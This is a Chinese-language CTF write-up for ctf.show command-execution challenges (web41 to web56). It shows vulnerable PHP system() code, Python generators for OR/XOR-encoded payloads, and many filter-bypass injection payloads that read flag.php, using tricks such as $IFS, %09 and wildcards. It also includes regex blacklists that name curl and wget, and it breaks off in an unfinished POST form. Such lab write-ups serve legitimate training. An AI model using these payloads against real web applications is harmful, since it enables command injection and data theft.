class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">generate</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&amp;|\-/i'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结合羽师傅的python的脚本：</p><p><strong>或：</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> urllib<span class="token keyword">from</span> sys <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> os<span class="token keyword">def</span> <span class="token function">action</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">:</span>   s1<span class="token operator">=</span><span class="token string">""</span>   s2<span class="token operator">=</span><span class="token string">""</span>   <span class="token keyword">for</span> i <span class="token keyword">in</span> arg<span class="token punctuation">:</span>       f<span class="token operator">=</span>open<span class="token punctuation">(</span><span class="token string">"or_rce.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span>       <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>           t<span class="token operator">=</span>f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>           <span class="token keyword">if</span> t<span class="token operator">==</span><span class="token string">""</span><span class="token punctuation">:</span>               <span class="token keyword">break</span>           <span class="token keyword">if</span> t<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span>i<span class="token punctuation">:</span>               <span class="token comment" spellcheck="true">#print(i)</span>               s1<span class="token operator">+=</span>t<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span>               s2<span class="token operator">+=</span>t<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>               <span class="token keyword">break</span>       f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>   output<span class="token operator">=</span><span class="token string">"(\""</span><span class="token operator">+</span>s1<span class="token operator">+</span><span class="token string">"\"|\""</span><span class="token operator">+</span>s2<span class="token operator">+</span><span class="token string">"\")"</span>   <span class="token keyword">return</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>   param<span class="token operator">=</span>action<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">"\n[+] your function："</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token operator">+</span>action<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">"[+] your command："</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">";"</span>   <span class="token keyword">print</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>异或：</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> urllib<span class="token keyword">from</span> sys <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> os<span class="token keyword">def</span> <span class="token function">action</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">:</span>   s1<span class="token operator">=</span><span class="token string">""</span>   s2<span class="token operator">=</span><span class="token string">""</span>   <span class="token keyword">for</span> i <span class="token keyword">in</span> arg<span class="token punctuation">:</span>       f<span class="token operator">=</span>open<span class="token punctuation">(</span><span class="token string">"xor_rce.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span>       <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>           t<span class="token operator">=</span>f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>           <span class="token keyword">if</span> t<span class="token operator">==</span><span class="token string">""</span><span class="token punctuation">:</span>               <span class="token keyword">break</span>           <span class="token keyword">if</span> t<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span>i<span class="token punctuation">:</span>               <span class="token comment" spellcheck="true">#print(i)</span>               s1<span class="token operator">+=</span>t<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span>               s2<span class="token operator">+=</span>t<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>               <span class="token keyword">break</span>       f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>   output<span class="token operator">=</span><span class="token string">"(\""</span><span class="token operator">+</span>s1<span class="token operator">+</span><span class="token string">"\"^\""</span><span class="token operator">+</span>s2<span class="token operator">+</span><span class="token string">"\")"</span>   <span class="token keyword">return</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>   param<span class="token operator">=</span>action<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">"\n[+] your function："</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token operator">+</span>action<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">"[+] your command："</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">";"</span>   <span class="token keyword">print</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="payload：-5"><a href="#payload：-5" class="headerlink" title="payload："></a>payload：</h3><pre class="line-numbers language-php"><code class="language-php">c<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token string">"%13%19%13%14%05%0d"</span><span class="token operator">|</span><span class="token string">"%60%60%60%60%60%60"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"%0c%13"</span><span class="token operator">|</span><span class="token string">"%60%60"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#</span>c<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token string">"%13%19%13%14%05%0d"</span><span class="token operator">|</span><span class="token string">"%60%60%60%60%60%60"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"%03%01%14%00%06%0c%01%07%00%10%08%10"</span><span class="token operator">|</span><span class="token string">"%60%60%60%20%60%60%60%60%2e%60%60%60"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"echo("</span><span class="token string">");system('cat flag.php');#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B406%E6%9C%8823%E6%97%A51607_1.png" alt></p><h2 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">.</span><span class="token string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>1：&gt; 代表重定向到哪里，例如：echo “123” &gt; /home/123.txt<br>2：/dev/null 代表空设备文件<br>3：2&gt; 表示stderr标准错误<br>4：&amp; 表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于1<br>5：1 表示stdout标准输出，系统默认值是1，所以”&gt;/dev/null”等同于 “1&gt;/dev/null”<br>因此，&gt;/dev/null 2&gt;&amp;1 也可以写成“1&gt; /dev/null 2&gt; &amp;1”</p><p>那么本文标题的语句执行过程为：<br>1&gt;/dev/null ：首先表示标准输出重定向到空设备文件，也就是不输出任何信息到终端，也就是不显示任何信息。<br>2&gt;&amp;1 ： 接着，标准错误输出重定向到标准输出，因为之前标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。</p><p>这里我再来进行一波解释：<br>0表示键盘输入，1表示屏幕输出，2表示错误输出！<br>‘ &gt; ’ 默认标准输出重定向，与1&gt;相同<br>2&gt;&amp;1 意思是把标准错误输出重定向到标准输出<br>&amp;&gt;file 意思是把标准输出和标准错误输出都重定向到文件file中</p><p>而我们想要得到输出，就不能让后面的进行执行，所以可以加上截断语句</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span>cat flag<span class="token punctuation">.</span>php<span class="token operator">||</span><span class="token operator">?</span>c<span class="token operator">=</span>cat flag<span class="token punctuation">.</span>php<span class="token operator">%</span><span class="token number">26</span><span class="token operator">?</span>c<span class="token operator">=</span>cat flag<span class="token punctuation">.</span>php<span class="token operator">%</span><span class="token number">26</span><span class="token operator">%</span><span class="token number">26</span><span class="token operator">?</span>c<span class="token operator">=</span>cat flag<span class="token punctuation">.</span>php<span class="token operator">%</span>0a<span class="token operator">?</span>c<span class="token operator">=</span>cat flag<span class="token punctuation">.</span>php<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\;|cat|flag| |[0-9]|\\$|\*/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">.</span><span class="token string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="payload：-6"><a href="#payload：-6" class="headerlink" title="payload："></a>payload：</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span>tac<span class="token operator">%</span>09fla<span class="token operator">?</span><span class="token punctuation">.</span>php<span class="token operator">||</span><span class="token operator">?</span>c<span class="token operator">=</span>nl<span class="token operator">%</span>09fla<span class="token string">''</span>g<span class="token punctuation">.</span>php<span class="token operator">%</span>0a<span class="token operator">?</span>c<span class="token operator">=</span>more<span class="token operator">%</span>09fl\<span class="token package">ag</span><span class="token punctuation">.</span>php<span class="token operator">%</span><span class="token number">26</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a><strong>空格绕过</strong></h4><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">></span> <span class="token markup">&lt; &lt;></span> 重定向符<span class="token operator">%</span><span class="token function">09</span><span class="token punctuation">(</span>需要php环境<span class="token punctuation">)</span>$<span class="token punctuation">{</span><span class="token constant">IFS</span><span class="token punctuation">}</span><span class="token variable">$IFS</span><span class="token variable">$9</span><span class="token variable">$IFS</span>\<span class="token punctuation">{</span>cat<span class="token punctuation">,</span>flag<span class="token punctuation">.</span>php<span class="token punctuation">}</span> <span class="token comment" spellcheck="true">//用逗号实现了空格功能</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">09</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">.</span><span class="token string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="读文件绕过-cat绕过"><a href="#读文件绕过-cat绕过" class="headerlink" title="读文件绕过(cat绕过)"></a><strong>读文件绕过(cat绕过)</strong></h3><pre><code>适用条件:过滤了cat1)more:一页一页的显示档案内容(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页(3)head:查看头几行(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示(5)tail:查看尾几行(6)nl：显示的时候，顺便输出行号(7)od:以二进制的方式读取档案内容(8)vi:一种编辑器，这个也可以查看(9)vim:一种编辑器，这个也可以查看(10)sort:可以查看,将文件进行排序并输出(11)uniq:可以查看，报告或忽略文件中的重复行(12)file -f:报错出具体内容grep grep test *file   #在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行</code></pre><h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload:"></a>payload:</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span>uniq<span class="token operator">%</span>09fla<span class="token operator">?</span><span class="token punctuation">.</span>php<span class="token operator">%</span><span class="token number">26</span><span class="token operator">?</span>c<span class="token operator">=</span>od<span class="token operator">%</span>09fl\<span class="token package">ag</span><span class="token punctuation">.</span>php<span class="token operator">%</span><span class="token number">26</span><span class="token operator">%</span><span class="token number">26</span><span class="token operator">?</span>c<span class="token operator">=</span>vi<span class="token operator">%</span>09fl\<span class="token package">ag</span><span class="token punctuation">.</span>php<span class="token operator">%</span><span class="token number">26</span><span class="token operator">%</span><span class="token number">26</span><span class="token operator">?</span>c<span class="token operator">=</span>tac<span class="token operator">%</span>09fl\<span class="token package">ag</span><span class="token punctuation">.</span>php<span class="token operator">||</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">.</span><span class="token string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload:"></a>payload:</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span>nl<span class="token variable">$IFS</span>\<span class="token package">fla</span><span class="token operator">?</span><span class="token punctuation">.</span>php<span class="token operator">||</span><span class="token operator">?</span>c<span class="token operator">=</span>nl<span class="token variable">$IFS</span>\<span class="token package">fla<span class="token punctuation">\</span>g</span><span class="token punctuation">.</span>php<span class="token operator">||</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload:"></a>payload:</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span>vi<span class="token variable">$IFS</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span>c<span class="token operator">=</span>uniq<span class="token variable">$IFS</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token operator">/</span>bin<span class="token operator">/</span>c<span class="token operator">?</span><span class="token operator">?</span><span class="token variable">$IFS</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="web55-无字母"><a href="#web55-无字母" class="headerlink" title="web55(无字母)"></a>web55(无字母)</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// 你们在炫技吗？</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\;|[a-z]|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="bin目录"><a href="#bin目录" class="headerlink" title="/bin目录"></a>/bin目录</h3><pre><code>bin为binary的简写主要放置一些 系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等这里我们可以利用 base64 中的64 进行通配符匹配 即 /bin/base64 flag.php</code></pre><h4 id="payload：-7"><a href="#payload：-7" class="headerlink" title="payload："></a>payload：</h4><pre><code>?c=/???/????64 ????.???也就是/bin/base64 flag.php</code></pre><h3 id="usr-bin目录"><a href="#usr-bin目录" class="headerlink" title="/usr/bin目录"></a>/usr/bin目录</h3><pre><code>主要放置一些应用软件工具的必备执行档例如c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome*、 zip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb*、wget等。我们可以利用/usr/bin下的bzip2意思就是说我们先将flag.php文件进行压缩，然后再将其下载</code></pre><h4 id="paylaod："><a href="#paylaod：" class="headerlink" title="paylaod："></a>paylaod：</h4><pre><code>先?c=/???/???/????2 ????.???然后在url + /flag.php.bz2 下载文件</code></pre><h2 id="web56-无字母和数字"><a href="#web56-无字母和数字" class="headerlink" title="web56(无字母和数字)"></a>web56(无字母和数字)</h2><p>类似题目：2021-第五届世界智能大会-「津门杯」国际网络安全创新大赛-Web-hate_php</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// 你们在炫技吗？</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再看一遍<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">p神的文章</a></p><p>利用通配符绕过，外带sh脚本（此处需要传输post数据）</p><p>所有就要先构造post包：</p><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>POST数据包POC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token 